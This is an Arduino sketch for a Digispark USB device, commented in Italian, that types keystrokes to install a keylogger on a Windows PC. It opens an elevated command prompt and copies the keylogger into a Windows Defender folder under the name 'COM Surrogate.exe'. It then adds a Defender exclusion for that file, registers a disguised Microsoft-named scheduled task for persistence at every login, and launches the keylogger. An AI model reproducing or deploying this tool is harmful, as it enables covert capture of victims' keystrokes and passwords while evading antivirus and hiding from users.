#include "DigiKeyboardIT.h"

// "C:\Users\brand\AppData\Local\Arduino15\packages\digistump\hardware\avr\1.6.7\libraries\DigisparkKeyboard\DigiKeyboardIT.h"

/*
* Viene copiata la cartella di Python v3.11 dentro il disco C: "C:\Python\Python311\"
* Il percorso dova verrà salvato il keylogger è il seguente -> "C:\ProgramData\Microsoft\Windows\DeviceSync"
* Poi verrà creata la seguente variabile di sistema -> "C:\Python\Python311"
* infine viene creata la task dal task scheduler per poter avviare l'eseguibile ogni volta che un qualsiasi utente entra nel PC
*/

void setup() {
  pinMode(1, OUTPUT);
}

void loop() {
  // apro il terminale di windows
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // WIN + R (apro l'esegui di windows) (Run)
  DigiKeyboard.delay(500);
  DigiKeyboard.print("cmd");
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT + MOD_SHIFT_LEFT); // apro il cmd
  // se serve inserire la password amministratore modificare questo pezzo di codice altrimenti lasciare così com'è
  /* --- */
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  /* --- */
  DigiKeyboard.print("cd \"C:\\ProgramData\\Microsoft\\Windows Defender\\Scans\\History\\Results\\Quick\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("copy \"");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_CAPSLOCK); // attivo il caps Lock
  // aspetto 5 secondi per permettere di inserire la lettera relativa alla chiavetta USB
  DigiKeyboard.delay(5000);
  DigiKeyboard.sendKeyStroke(KEY_CAPSLOCK);
  DigiKeyboard.delay(500);
  DigiKeyboard.print(":\\COM Surrogate.exe\" .");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  /* Aggiungo il file .exe (il keylogger) all'elenco delle esclusioni di Microsoft Defender */
  DigiKeyboard.print("Add-MpPreference -ExclusionPath \"C:\\ProgramData\\Microsoft\\Windows Defender\\Scans\\History\\Results\\Quick\\COM Surrogate.exe\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1500);
  DigiKeyboard.print("cls");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  /* vado a creare la task nel TaskScheduler */
  // inizializzo una variabile $taskPath alla quale assegno il percorso del file .xml per la configurazione della task
  DigiKeyboard.print("$taskPath = \"");
  // aspetto 5 secondi per permettere di inserire la lettera relativa alla chiavetta USB
  DigiKeyboard.delay(5000);
  // finisco di scrivere il percorso per il file xml di configurazione
  DigiKeyboard.print(":\\FamilySafetyGeneral.xml\"");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  // inizializzo un'altra variabile per salvarmi il nome della task con il relativo percorso
  DigiKeyboard.print("$taskName = \"\\Microsoft\\Windows\\Shell\\FamilySafetyGeneral\"");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  // infine registro la task tra quelle già esistenti
  DigiKeyboard.print("Register-ScheduledTask -Xml (Get-Content $taskPath | Out-String) -TaskName $taskName");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  // avvio il keylogger
  DigiKeyboard.print("start \"C:\\ProgramData\\Microsoft\\Windows Defender\\Scans\\History\\Results\\Quick\\COM Surrogate.exe\"");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  // chiudo il terminale powershell
  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT); // ALT + F4
  DigiKeyboard.delay(500);

  // programma finito
  // accendo il led per segnalare la fine
  digitalWrite(1, HIGH);
  for (;;) { }
}
